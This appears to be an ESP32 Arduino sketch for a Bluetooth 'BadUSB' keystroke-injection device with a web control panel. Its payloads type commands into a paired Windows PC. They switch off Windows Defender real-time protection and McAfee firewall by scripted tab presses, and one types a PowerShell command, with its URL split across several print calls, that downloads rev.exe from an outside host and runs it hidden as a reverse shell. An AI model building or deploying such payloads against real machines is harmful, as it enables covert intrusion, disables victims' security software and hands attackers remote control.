#include <BleKeyboard.h>
#include <WiFi.h>
#include <WebServer.h>

const char* ssid = "WiFi Name";
const char* password = "WiFi Password";

BleKeyboard bleKeyboard("ESP32_BadUSB", "CyberSecurityOrg", 100);
WebServer server(80);

// HTML page for web interface
const char MAIN_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>ESP32 BadUSB Control</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 30px; }
    button {
      padding: 15px 30px;
      font-size: 18px;
      margin: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3e8e41;
    }
  </style>
</head>
<body>
  <h2>ESP32 BadUSB Remote Payloads</h2>
  <button onclick="sendCommand('KEY_1')">Run whoami</button>
  <button onclick="sendCommand('KEY_2')">Run ipconfig</button>
  <button onclick="sendCommand('ENTER')">Press Enter</button>
  <button onclick="sendCommand('WA_SORRY')">Greet Yogi</button>
  <button onclick="sendCommand('DIS_DEF')">Disable Defender</button>
  <button onclick="sendCommand('DIS_MCFEE')">Disable Mcfee Firewall</button>
  <button onclick="sendCommand('DIS_MC')">Disable Mcfee</button>
  <button onclick="sendCommand('REV_PS')">Run Reverse Shell</button>
  <script>
    function sendCommand(cmd) {
      fetch(`/sendCommand?cmd=${cmd}`).then(res => res.text()).then(alert);
    }
  </script>
</body>
</html>
)rawliteral";

// Function to send WhatsApp message
void sendWhatsAppApology() {
  if (!bleKeyboard.isConnected()) return;

  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.release(KEY_LEFT_GUI);
  delay(400);
  bleKeyboard.print("whatsapp");
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(8000);

  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('f');
  bleKeyboard.releaseAll();
  delay(200);

  bleKeyboard.print("Yogi");
  delay(500);
  bleKeyboard.write(KEY_TAB);
  delay(200);
  bleKeyboard.write(KEY_RETURN);
  delay(600);
  bleKeyboard.print("Hello");
  bleKeyboard.write(KEY_RETURN);
}

// Function to download and execute Python reverse shell
void downloadAndExecuteExeReverseShell() {
  if (!bleKeyboard.isConnected()) return;

  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  bleKeyboard.releaseAll();
  delay(1000);

  bleKeyboard.print("powershell");
  delay(200);
  bleKeyboard.write(KEY_RETURN);
  delay(3000);

  bleKeyboard.print("Invoke-Web");
  delay(300);
  bleKeyboard.print("Request -Uri");
  delay(300);
  bleKeyboard.print(" 'http://192.168.35");
  delay(300);
  bleKeyboard.print(".152:8000/rev.exe' ");
  delay(300);
  bleKeyboard.print("-OutFile ");
  delay(300);
  bleKeyboard.print("$env:TEMP\\rev.exe");
  delay(500);
  bleKeyboard.write(KEY_RETURN);
  delay(30000);

  bleKeyboard.print("Start-Process ");
  delay(300);
  bleKeyboard.print("$env:TEMP\\rev.exe");
  delay(300);
  bleKeyboard.print(" -WindowStyle");
  delay(300);
  bleKeyboard.print(" Hidden");
  delay(500);
  bleKeyboard.write(KEY_RETURN);
}

// Handle incoming web commands
void handleCommand() {
  String cmd = server.arg("cmd");

  if (bleKeyboard.isConnected()) {
    if (cmd == "KEY_1") {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      bleKeyboard.releaseAll();
      delay(800);
      bleKeyboard.print("cmd");
      bleKeyboard.write(KEY_RETURN);
      delay(800);
      bleKeyboard.print("whoami");
      bleKeyboard.write(KEY_RETURN);

    } else if (cmd == "KEY_2") {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      bleKeyboard.releaseAll();
      delay(800);
      bleKeyboard.print("cmd");
      bleKeyboard.write(KEY_RETURN);
      delay(800);
      bleKeyboard.print("ipconfig");
      bleKeyboard.write(KEY_RETURN);

    } else if (cmd == "ENTER") {
      bleKeyboard.write(KEY_RETURN);

    } else if (cmd == "WA_SORRY") {
      sendWhatsAppApology();

    } else if (cmd == "REV_PS") {
      downloadAndExecuteExeReverseShell();  // Updated here

    } else if (cmd == "DIS_MCFEE") {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      bleKeyboard.releaseAll();
      delay(500);

      bleKeyboard.print("windowsdefender");
      delay(300);
      bleKeyboard.print("://Threat/");
      delay(500);
      bleKeyboard.write(KEY_RETURN);
      delay(6000);

      bleKeyboard.write(KEY_TAB);
      delay(300);
      bleKeyboard.write(KEY_RETURN);
      delay(10000);

      int i = 0;
      for(i=0;i<11;i++){
        bleKeyboard.write(KEY_TAB);
        delay(300);
      }
      bleKeyboard.write(KEY_RETURN);
      delay(800);
      bleKeyboard.write(' ');
      delay(800);
      bleKeyboard.write(KEY_TAB);
      delay(300);
      bleKeyboard.write(KEY_RETURN);
      delay(8000);
      bleKeyboard.write(KEY_TAB);
      delay(1000);
      bleKeyboard.write(KEY_TAB);
      delay(1000);
      bleKeyboard.write(KEY_RETURN);
      delay(3000);

    } else if (cmd == "DIS_MC") {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      bleKeyboard.releaseAll();
      delay(500);

      bleKeyboard.print("windowsdefender");
      delay(300);
      bleKeyboard.print("://Threat/");
      delay(500);
      bleKeyboard.write(KEY_RETURN);
      delay(6000);

      bleKeyboard.write(KEY_TAB);
      delay(300);
      bleKeyboard.write(KEY_RETURN);
      delay(10000);

      for(i=0;i<7;i++){
        bleKeyboard.write(KEY_TAB);
        delay(300);
      }
      bleKeyboard.write(KEY_RETURN);
      delay(800);

      for(i=0;i<8;i++){
        bleKeyboard.write(KEY_TAB);
        delay(300);
      }
      bleKeyboard.write(KEY_RETURN);
      delay(800);
      bleKeyboard.write(KEY_RETURN);
      delay(800);

      bleKeyboard.write(KEY_TAB);
      delay(300);
      bleKeyboard.write(KEY_RETURN);
      delay(8000);

      bleKeyboard.write(KEY_TAB);
      delay(1000);
      bleKeyboard.write(KEY_TAB);
      delay(1000);
      bleKeyboard.write(KEY_RETURN);
      delay(3000);
    } else if (cmd == "DIS_DEF") {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      bleKeyboard.releaseAll();
      delay(500);

      bleKeyboard.print("windowsdefender");
      delay(300);
      bleKeyboard.print("://Threat/");
      delay(500);
      bleKeyboard.write(KEY_RETURN);
      delay(6000);

      for(i=0;i<4;i++){
        bleKeyboard.write(KEY_TAB);
        delay(300);
      }
      bleKeyboard.write(KEY_RETURN);
      delay(300);

      bleKeyboard.write(' ');
      delay(800);

      bleKeyboard.write(KEY_TAB);
      delay(500);
      bleKeyboard.write(KEY_TAB);
      delay(500);
      bleKeyboard.write(KEY_RETURN);
      delay(3000);

    }
  }

  server.send(200, "text/plain", "Command sent: " + cmd);
}

void setup() {
  Serial.begin(115200);

  WiFi.begin(ssid, password);
  Serial.print("Connecting to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nWiFi connected. IP address: " + WiFi.localIP().toString());

  server.on("/", HTTP_GET, []() {
    server.send_P(200, "text/html", MAIN_page);
  });

  server.on("/sendCommand", HTTP_GET, handleCommand);
  server.begin();

  bleKeyboard.begin();
}

void loop() {
  server.handleClient();
}
